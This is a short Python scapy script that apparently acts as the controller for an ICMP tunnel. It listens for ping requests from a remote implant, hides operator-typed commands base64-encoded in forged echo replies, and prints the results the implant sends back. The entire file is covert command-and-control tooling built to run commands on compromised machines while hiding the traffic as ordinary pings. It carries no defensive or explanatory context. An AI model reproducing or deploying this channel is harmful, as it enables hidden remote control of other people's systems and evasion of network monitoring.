#!/usr/bin/python3

from scapy.all import *
from threading import Thread, Lock
from base64 import *

rec_mutex=Lock()
command_ready = 0
command=""
msg=""

def parse_end(packet):
	if ('END' == b64decode(packet[Raw].load).decode('ascii').split()[-1]):
		return True

def send_cmd(packet, command):
	print(packet[0][Ether].src)
	print(packet[0][IP].src)
	ping_rep=Ether(dst=packet[0][Ether].src)/IP(dst=packet[0][IP].src, id=packet[0][IP].id)/ICMP(type="echo-reply",)/(b64encode(command.encode('ascii')))
	send(ping_rep)
	print("sent")
	
def msg_action(msg):
	if(msg[-2] == 'LS'):
		print("".join(msg[0:-2]))
	elif(msg[-2] == ''):
		pass
	elif(msg[-2] == ''):
		pass
		
def recieve_msg():
	try:
		while True:
			prailer = "START "
			rp = sniff(filter="icmp and icmp[0]=8", stop_filter=parse_end)
			msg = b64decode(rp[0][Raw].load).decode('ascii').split()
			global command_ready
			if(command_ready and 'READY' == msg[0]):
				rec_mutex.acquire()
				send_cmd(rp, prailer+command)
				command_ready = 0
				rec_mutex.release()
			elif('READY' != msg[0]):
				msg_action(msg)
			
	except KeyboardInterrupt:
		return
	except Exception as e:
		print(e)	
	
def main():
	try:
		lt = Thread(target=recieve_msg)
		lt.start()
	except:
		print("cant start response/listening thread")
	try:
		global command_ready
		global command
		while True:
			command = input("Enter command: ")
			rec_mutex.acquire()
			command_ready = 1
			rec_mutex.release()
			
	except KeyboardInterrupt:
		return 
	except Exception as e:
		print(e)
	finally:
		return 0
		
		
if __name__=="__main__":
	main()
